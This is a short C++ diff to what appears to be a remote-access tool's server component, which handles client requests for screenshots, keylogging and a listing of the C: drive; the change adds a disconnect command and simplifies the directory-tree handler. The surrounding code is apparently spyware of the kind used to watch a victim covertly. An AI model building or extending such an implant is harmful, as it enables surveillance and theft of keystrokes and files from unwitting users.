@@ -224,6 +224,8 @@ void Server::start(){
                         responseToClient = this->screenShot();
                     else if (requestFromClient.type() == DIR_TREE_REQUEST)
                         responseToClient = this->dirTree();
+                    else if (requestFromClient.type() == DISCONNECT_REQUEST)
+                        responseToClient = this->disconnect();
                     else 
                         responseToClient = Response(UNKNOWN_RESPONSE, OK_CODE, 0, NULL);
 
@@ -475,13 +477,17 @@ Response Server::keyLog(){
     
 Response Server::dirTree(){
     cout << "Server: Received directory tree instruction.\n";
-    uint32_t errCode;
     string result = printDirectoryTree("C:\\", 0);
-    
-    errCode = OK_CODE;
 
     cout << "Server: Directoried tree.\n";
-    return Response(DIR_TREE_RESPONSE, errCode, result.size() + 1, (void*)result.c_str());
+    return Response(DIR_TREE_RESPONSE, OK_CODE, result.size() + 1, (void*)result.c_str());
+}
+
+Response Server::disconnect(){
+    cout << "Server: Received disconnect instruction.\n";
+    cout << "Server: Client disconnected.\n";
+
+    return Response(DISCONNECT_RESPONSE, OK_CODE, 0, NULL);
 }
 
 // Function to get the PID of a process given its name
